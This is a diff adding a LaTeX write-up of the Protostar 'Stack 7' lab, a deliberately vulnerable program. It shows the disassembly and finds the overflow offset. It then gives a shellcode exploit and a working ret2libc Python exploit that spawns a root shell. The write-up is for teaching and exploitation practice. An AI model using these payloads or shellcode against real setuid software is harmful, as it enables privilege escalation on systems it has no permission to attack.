@@ -1,0 +1,183 @@
+ \begin{center}\begin{LARGE}Stack 7\end{LARGE}\end{center}
+ 
+\subsection*{Problem}
+
+\begin{minted}[ frame=lines, framesep=2mm, baselinestretch=1.2, bgcolor=LightGray, fontsize=\footnotesize, linenos ] {bash}
+Dump of assembler code for function getpath:
+0x080484c4 <getpath+0>: push   ebp
+0x080484c5 <getpath+1>: mov    ebp,esp
+0x080484c7 <getpath+3>: sub    esp,0x68
+0x080484ca <getpath+6>: mov    eax,0x8048620
+0x080484cf <getpath+11>:        mov    DWORD PTR [esp],eax
+0x080484d2 <getpath+14>:        call   0x80483e4 <printf@plt>
+0x080484d7 <getpath+19>:        mov    eax,ds:0x8049780
+0x080484dc <getpath+24>:        mov    DWORD PTR [esp],eax
+0x080484df <getpath+27>:        call   0x80483d4 <fflush@plt>
+0x080484e4 <getpath+32>:        lea    eax,[ebp-0x4c]
+0x080484e7 <getpath+35>:        mov    DWORD PTR [esp],eax
+0x080484ea <getpath+38>:        call   0x80483a4 <gets@plt>
+0x080484ef <getpath+43>:        mov    eax,DWORD PTR [ebp+0x4]
+0x080484f2 <getpath+46>:        mov    DWORD PTR [ebp-0xc],eax
+0x080484f5 <getpath+49>:        mov    eax,DWORD PTR [ebp-0xc]
+0x080484f8 <getpath+52>:        and    eax,0xb0000000
+0x080484fd <getpath+57>:        cmp    eax,0xb0000000
+0x08048502 <getpath+62>:        jne    0x8048524 <getpath+96>
+0x08048504 <getpath+64>:        mov    eax,0x8048634
+0x08048509 <getpath+69>:        mov    edx,DWORD PTR [ebp-0xc]
+0x0804850c <getpath+72>:        mov    DWORD PTR [esp+0x4],edx
+0x08048510 <getpath+76>:        mov    DWORD PTR [esp],eax
+0x08048513 <getpath+79>:        call   0x80483e4 <printf@plt>
+0x08048518 <getpath+84>:        mov    DWORD PTR [esp],0x1
+0x0804851f <getpath+91>:        call   0x80483c4 <_exit@plt>
+0x08048524 <getpath+96>:        mov    eax,0x8048640
+0x08048529 <getpath+101>:       lea    edx,[ebp-0x4c]
+0x0804852c <getpath+104>:       mov    DWORD PTR [esp+0x4],edx
+0x08048530 <getpath+108>:       mov    DWORD PTR [esp],eax
+0x08048533 <getpath+111>:       call   0x80483e4 <printf@plt>
+0x08048538 <getpath+116>:       lea    eax,[ebp-0x4c]
+0x0804853b <getpath+119>:       mov    DWORD PTR [esp],eax
+0x0804853e <getpath+122>:       call   0x80483f4 <strdup@plt>
+0x08048543 <getpath+127>:       leave
+0x08048544 <getpath+128>:       ret
+End of assembler dump.
+\end{minted}
+
+\subsection*{Idea and Attack process}
+
+We try to find the offset for the target by injecting the string below. Based on the segmentation fault message we can deduce that the offset needed is 80bytes.
+
+\begin{minted}[ frame=lines, framesep=2mm, baselinestretch=1.2, bgcolor=LightGray, fontsize=\footnotesize, linenos, breaklines ] {bash}
+./stack7
+>>>input path please: 
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0
+Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1
+Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2
+Ag3Ag4Ag5Ag
+>>Program received signal SIGSEGV, Segmentation fault.
+>>0x37634136 in ?? ()
+\end{minted}
+
+\begin{minted}[ frame=lines, framesep=2mm, baselinestretch=1.2, bgcolor=LightGray, fontsize=\footnotesize, linenos, breaklines] {python}
+import struct
+filler = "1" * 80
+addr_hop = struct.pack("I", 0x08048544)
+addr_code = struct.pack("I", 0xbffffcb4+256)
+nop = "\x90"*528
+code =  "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\
+x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\
+x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\
+xcd\x80"
+print filler+addr_hop+addr_code+nop+code
+\end{minted}
+
+We run the code below and we realise that the exploit is not working even after increase the nop sled. We try to find another way perhaps ret2libc.
+
+\begin{minted}[ frame=lines, framesep=2mm, baselinestretch=1.2, bgcolor=LightGray, fontsize=\footnotesize, linenos ] {bash}
+vim stack7_py.py
+python stack7_py.py > /tmp/payload
+(python stack7_py.py; cat) | ./stack7
+\end{minted}
+
+Lets try to find the address of the lib-c. We use the following commands to obtain the necessary information.
+
+\begin{minted}[ frame=lines, framesep=2mm, baselinestretch=1.2, bgcolor=LightGray, fontsize=\footnotesize, linenos ] {bash}
+info proc map
+>>>process 6855
+>>>cmdline = '/opt/protostar/bin/stack7'
+>>>cwd = '/opt/protostar/bin'
+>>>exe = '/opt/protostar/bin/stack7'
+>>>Mapped address spaces:
+>>>
+>>>        Start Addr   End Addr       Size     Offset objfile
+>>>         0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack7
+>>>         0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack7
+>>>        0xb7e96000 0xb7e97000     0x1000          0
+>>>        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
+>>>        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
+>>>        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
+>>>        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
+>>>        0xb7fd9000 0xb7fdc000     0x3000          0
+>>>        0xb7fde000 0xb7fe2000     0x4000          0
+>>>        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
+>>>        0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
+>>>        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
+>>>        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
+>>>        0xbffeb000 0xc0000000    0x15000          0           [stack]
+
+p system
+>>>$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
+p exit
+>>>$2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>
+\end{minted}
+
+We note that the base address of lib-c is `0xb7e97000`.
+
+We identify the location of the `system` command in lib-c to invoke it during the attack. The `exit` command is used so that the attack exits gracefully once we exit the shell. The `system` command takes in parameters to run, we want to pass in the `\\bin\\sh` command to system, one way is to use the address in lib-c that contains it. Through checking lib-c, we find the offset to the string and use it with the base address to obtain the pointer to the string. We should note that the structure of the stack is as follow below which we are trying to emulate. The system call will obtain the parameter 8bytes below ebp, which is past the old ebp and the return address.
+
+\begin{minted}[ frame=lines, framesep=2mm, baselinestretch=1.2, bgcolor=LightGray, fontsize=\footnotesize, linenos ] {bash}
+function address (system call)
+return address (exit call)
+parameters (/bin/sh)
+\end{minted}
+
+With the plan in place, we create the following script and run it.
+
+\begin{minted}[ frame=lines, framesep=2mm, baselinestretch=1.2, bgcolor=LightGray, fontsize=\footnotesize, linenos ] {python}
+import struct
+
+filler = "1" * 80
+addr_hop = struct.pack("I", 0x08048544)
+libc_start = 0xb7e97000
+string_offset = 0x11f3bf
+bin_addr = struct.pack("I", libc_start + string_offset)
+system_addr = struct.pack("I", 0xb7ecffb0)
+exit_addr = struct.pack("I", 0xb7ec60c0)
+
+print filler + addr_hop + system_addr + exit_addr + bin_addr
+\end{minted}
+
+We run the following script, this time since we want to hold the shell open, we pass in the script as such whereby after the `cat` command, we pass a `-` such that the terminal holds the shell open for us to pass in other commands. Reference `cat` command using `man` -> (cat f - g  Output f's contents, then standard input, then g's contents.)
+
+\begin{minted}[ frame=lines, framesep=2mm, baselinestretch=1.2, bgcolor=LightGray, fontsize=\footnotesize, linenos ] {bash}
+whoami
+>>>user
+vim stack7_py.py
+python stack7_py.py > /tmp/payload
+cat /tmp/payload - | ./stack7
+whoami
+>>>root
+\end{minted}
+
+\subsection*{Source code}
+
+\begin{minted}[ frame=lines, framesep=2mm, baselinestretch=1.2, bgcolor=LightGray, fontsize=\footnotesize, linenos ] {bash}
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+char *getpath()
+{
+  char buffer[64];
+  unsigned int ret;
+
+  printf("input path please: "); fflush(stdout);
+
+  gets(buffer);
+
+  ret = __builtin_return_address(0);
+
+  if((ret & 0xb0000000) == 0xb0000000) {
+      printf("bzzzt (%p)\n", ret);
+      _exit(1);
+  }
+
+  printf("got path %s\n", buffer);
+  return strdup(buffer);
+}
+
+int main(int argc, char **argv)
+{
+  getpath();
+}
+\end{minted}
